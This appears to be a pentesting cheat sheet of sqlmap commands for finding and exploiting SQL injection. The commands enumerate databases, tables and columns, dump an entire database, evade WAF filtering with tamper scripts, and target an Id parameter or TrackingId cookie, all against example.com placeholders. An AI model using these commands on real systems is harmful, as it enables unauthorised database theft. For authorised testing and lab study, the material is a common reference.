## SQL map commands:

### GET:
```
sqlmap -u "http://example.com/vulnerable.php?id=1"
```
### POST:
```
sqlmap -u "http://example.com/vulnerable.php" --data="id=1" //The --data flag allows you to specify POST parameters.
```
### FROM FILE:
```
sqlmap -r /path/to/request.txt
```
### Custom HTTP Headers:
```
sqlmap -u "http://example.com/vulnerable.php?id=1" --headers="User-Agent: Mozilla/5.0" //The --headers flag allows you to customize HTTP headers.
```
### Enumerate Databases:
```
sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs //Lists all available databases on the server.
```
### Dump Entire Database:
```
sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name --dump //Dumps all tables and data from the specified database.
```
### Enumerate Tables:
```
sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name --tables
```
### Enumerate Columns:
```
sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name -T table_name --columns
```
### Risk and Level:
```
sqlmap -u "http://example.com/vulnerable.php?id=1" --risk=3 --level=5
```
### Specify Parameter:
```
sqlmap -r /path/to/request.txt -p id
```

## ByPass:
```
sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=space2comment //Uses a tamper script (space2comment in this case) to evade simple WAF filtering
```
```
sqlmap -u "http://example.com/vulnerable.php?id=1" --batch //Runs sqlmap in non-interactive mode, automatically answering prompts
```
```
sqlmap -u "http://example.com/vulnerable.php?id=1" --timeout=10 //Sets a timeout for requests, helpful with slow servers.
```
## Where to test:

**Id** in Post number
**TrackingId** in Cookie Header

